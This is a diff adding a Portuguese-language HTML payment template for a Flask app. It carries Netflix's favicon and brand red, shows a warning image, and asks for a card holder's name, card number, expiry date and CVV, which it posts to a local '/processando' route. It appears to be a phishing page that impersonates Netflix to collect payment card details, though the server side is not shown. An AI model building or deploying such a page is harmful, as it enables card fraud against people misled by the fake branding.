@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <style>
+    .nome{
+    width: 43%;
+    height: 60px;
+    margin-top: 19%;
+    font-size: 17px;
+    font-family: Arial;
+    }
+
+    .sobrenome{
+    width: 43%;
+    height: 60px;
+    margin-top: 1.5%;
+    font-size: 17px;
+    font-family: Arial;
+    }
+
+    .cartao{
+    width: 43%;
+    height: 60px;
+    margin-top: 1.5%;
+    font-size: 17px;
+    font-family: Arial;
+    }
+
+    .validade{
+    width: 43%;
+    height: 60px;
+    margin-top: 1.5%;
+    font-size: 17px;
+    font-family: Arial;
+    }
+
+    .cvv{
+    width: 43%;
+    height: 60px;
+    margin-top: 1.5%;
+    font-size: 17px;
+    font-family: Arial;
+    }
+
+    form{
+
+    margin-left: 37%;
+    }
+
+     body{
+
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-image: url({{url_for('static', filename='pay.png')}})
+        }
+
+        .botaum{
+        background-color: #E50914;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        margin-top: 39%;
+        margin-left: 3px;
+        width: 40%;
+        height: 60px;
+        font-size: 25px;
+        font-family: Arial;
+        }
+    .aviso{
+    margin-left: 36%;
+    width: 26%;
+    }
+    </style>
+    <link rel="icon" href="{{url_for('static', filename='netflix.png')}}">
+    <meta charset="UTF-8">
+    <title>Pagamento</title>
+</head>
+<body>
+
+<div class="box">
+    <img class="aviso" src="{{url_for('static',filename='aviso.png')}}">
+    <form action="/processando" method="POST">
+        <input placeholder=" Nome" class="nome" type="text" name="nometitular"><br>
+        <input placeholder=" Sobrenome" class="sobrenome" type="text" name="sobrenome"><br>
+        <input placeholder=" Número do cartão" class="cartao" type="text" name="cartao"><br>
+        <input placeholder=" Validade do cartão" class="validade" type="text" name="validade"><br>
+        <input placeholder=" Codigo de segurança" class="cvv" type="text" name="cvv"><br>
+        <input class="botaum" type="submit" value="Iniciar assinatura">
+    </form>
+
+</div>
+
+</body>
+</html>
